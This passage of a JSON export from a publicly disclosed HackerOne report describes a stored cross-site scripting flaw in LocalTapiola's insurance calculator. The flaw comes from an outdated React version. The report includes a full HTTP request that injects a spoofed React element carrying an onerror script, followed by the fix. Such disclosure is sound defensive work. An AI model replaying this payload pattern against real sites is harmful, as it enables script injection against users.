            "updated_at": "2016-06-27T22:25:41.396Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Closing as resolved. Thank you for the well-written report.", 
            "markdown_message": "<p>Closing as resolved. Thank you for the well-written report.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1041878, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-06-27T22:26:00.863Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-27T22:26:00.863Z", 
            "actor": {
                "url": "/localtapiola", 
                "profile": {
                    "name": "LocalTapiola"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
                }
            }, 
            "team_handle": "localtapiola", 
            "bounty_amount": "300.0", 
            "collaborator": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1041882, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-27T22:26:59.474Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-27T22:26:59.474Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1041884, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-27T22:32:08.397Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-27T22:32:08.397Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1041888, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-27T22:32:08.494Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-27T22:32:08.494Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1041889, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "fransrosen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/fransrosen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/634/6e02242b5d1d893cef698144faa706fd1d75fea0_small.jpg?1396468576"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -74478326.20334613, 
    "disclosed_at": "2016-06-27T22:32:08.453Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/139004", 
    "created_at": "2016-05-15T21:21:03.025Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<h2 id=\"background\">Background</h2>\n\n<p>I noticed that the app at:<br>\n<a title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\" href=\"/redirect?signature=a515dbd12ed023b86500012fab343c271937d188&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>was running an old version of React. In this version (0.13.3) there&#39;s an issue, initially discovered by <a href=\"/danlec\">@danlec</a> actually on HackerOne: <a title=\"http://danlec.com/blog/xss-via-a-spoofed-react-element\" href=\"/redirect?signature=d5c0f162a694bc9f604abebe7d2a064e18c026e4&amp;url=http%3A%2F%2Fdanlec.com%2Fblog%2Fxss-via-a-spoofed-react-element\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://danlec.com/blog/xss-via-a-spoofed-react-element</span><i class=\"icon-external-link\"></i></a> </p>\n\n<p>The patch by React was made in version 0.14: <a title=\"https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\" href=\"/redirect?signature=b8bc9792a9c4c16a0f4014164cf2be70dac8febd&amp;url=https%3A%2F%2Ffacebook.github.io%2Freact%2Fblog%2F2015%2F10%2F07%2Freact-v0.14.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"poc\">PoC</h2>\n\n<p>So I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:</p>\n<pre class=\"highlight plaintext\"><code>POST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    &quot;79rtwta5z4hjkn3npvu5ak0521&quot;: {\n        &quot;dateOfIntroduction&quot;: {\n            &quot;isValid&quot;: true, \n            &quot;error&quot;: &quot;&quot;, \n...\n}\n</code></pre>\n<p>This would then respond with a unique identifier:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;id&quot;:&quot;ID&quot;}\n</code></pre>\n<p>This data would then be used, if you used a link formatted like this:<br>\n<a title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\" href=\"/redirect?signature=c3e3864007ce4585ffb31ffad30cb8b24b073045&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2FID\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you&#39;re able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the <code>&quot;error&quot;</code>-element.</p>\n\n<p>So, to use <a href=\"/danlec\">@danlec</a>&#39;s way to inject a spoofed React element, we use the following request:</p>\n<pre class=\"highlight plaintext\"><code>POST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{&quot;79rtwta5z4hjkn3npvu5ak0521&quot;:{&quot;postCode&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:{&quot;_store&quot;:{},&quot;type&quot;:&quot;body&quot;,&quot;props&quot;:{&quot;dangerouslySetInnerHTML&quot;:{&quot;__html&quot;:&quot;&lt;img src=x onerror=alert(document.domain)&gt;&quot;}},&quot;_isReactElement&quot;:true},&quot;value&quot;:&quot;jjj&quot;},&quot;dateOfIntroduction&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;JAJAJA&quot;},&quot;cylinderCapacity&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;yyy&quot;},&quot;manufacturerCode&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;zzz&quot;},&quot;netPower&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;bbb&quot;},&quot;birthDate&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;11.11.2011xxx&quot;},&quot;grossWeight&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;ccc&quot;},&quot;carType&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;x&quot;},&quot;isRentedOrLeased&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;eee&quot;},&quot;registrationPart2&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;fff&quot;},&quot;modelCode&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;ggg&quot;},&quot;registrationPart1&quot;:{&quot;isValid&quot;:true,&quot;error&quot;:&quot;&quot;,&quot;value&quot;:&quot;hhh&quot;}}}\n</code></pre>\n<p>You can see my inserted payload here:<br>\n<a title=\"https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\" href=\"/redirect?signature=a3849698fc8b6a049e4f52b3c52b13247fe68b92&amp;url=https%3A%2F%2Fverkkopalvelu.lahitapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2Fapi%2Fvehicle%2Flink%2Fcontinue%2Fc455cb02-6a14-4767-9c63-eb22d9c16be5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Which would then result in the following URL using the React app:<br>\n<a title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\" href=\"/redirect?signature=6897896b3cebb1da15ccf6efe1dbf569698b561f&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fc455cb02-6a14-4767-9c63-eb22d9c16be5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Which has the following output in the DOM:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2016-05-15_at_23.09.13.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225225Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3c53e88754ff1a53c6026482a5433130a3c397703b047cf84bff24fcbf0bbeec\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225225Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3c53e88754ff1a53c6026482a5433130a3c397703b047cf84bff24fcbf0bbeec\" class=\"markdown-inline-image\"></a></p>\n\n<p>That results in the javascript running when accessing the page:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2016-05-15_at_23.00.25.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225225Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=eb13adc3f666a2bd68c6de124a5901ad2e1bfa8cd2dd6ad27c2b4f617f30aca9\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225225Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=eb13adc3f666a2bd68c6de124a5901ad2e1bfa8cd2dd6ad27c2b4f617f30aca9\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>You should update the React version to &gt;0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
    "vulnerability_information": "Hi,\n\n## Background\nI noticed that the app at:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\n\nwas running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element \n\nThe patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\n\n## PoC\n\nSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \"79rtwta5z4hjkn3npvu5ak0521\": {\n        \"dateOfIntroduction\": {\n            \"isValid\": true, \n            \"error\": \"\", \n...\n}\n```\n\nThis would then respond with a unique identifier:\n```\n{\"id\":\"ID\"}\n```\nThis data would then be used, if you used a link formatted like this:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\n\nThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `\"error\"`-element.\n\nSo, to use @danlec's way to inject a spoofed React element, we use the following request:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\"79rtwta5z4hjkn3npvu5ak0521\":{\"postCode\":{\"isValid\":true,\"error\":{\"_store\":{},\"type\":\"body\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"<img src=x onerror=alert(document.domain)>\"}},\"_isReactElement\":true},\"value\":\"jjj\"},\"dateOfIntroduction\":{\"isValid\":true,\"error\":\"\",\"value\":\"JAJAJA\"},\"cylinderCapacity\":{\"isValid\":true,\"error\":\"\",\"value\":\"yyy\"},\"manufacturerCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"zzz\"},\"netPower\":{\"isValid\":true,\"error\":\"\",\"value\":\"bbb\"},\"birthDate\":{\"isValid\":true,\"error\":\"\",\"value\":\"11.11.2011xxx\"},\"grossWeight\":{\"isValid\":true,\"error\":\"\",\"value\":\"ccc\"},\"carType\":{\"isValid\":true,\"error\":\"\",\"value\":\"x\"},\"isRentedOrLeased\":{\"isValid\":true,\"error\":\"\",\"value\":\"eee\"},\"registrationPart2\":{\"isValid\":true,\"error\":\"\",\"value\":\"fff\"},\"modelCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"ggg\"},\"registrationPart1\":{\"isValid\":true,\"error\":\"\",\"value\":\"hhh\"}}}\n```\n\nYou can see my inserted payload here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich would then result in the following URL using the React app:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich has the following output in the DOM:\n\n{F94020}\n\nThat results in the javascript running when accessing the page:\n\n{F94022}\n\n## Solution\n\nYou should update the React version to >0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\n\nRegards,\nFrans", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.lahitapiola.fi", 
            "about": "LocalTapiola\u2019s products and services cover non-life, life and pension insurance, as well as investment and saving services.", 
            "twitter_handle": "", 
            "name": "LocalTapiola"
        }, 
        "handle": "localtapiola", 
        "url": "https://hackerone.com/localtapiola", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/008/416/23d72f4d3433458578a2ce1b4cc7574a935e2316_small.png?1457688936", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 8416, 
        "default_currency": "usd"
    }, 
    "is_published": false
}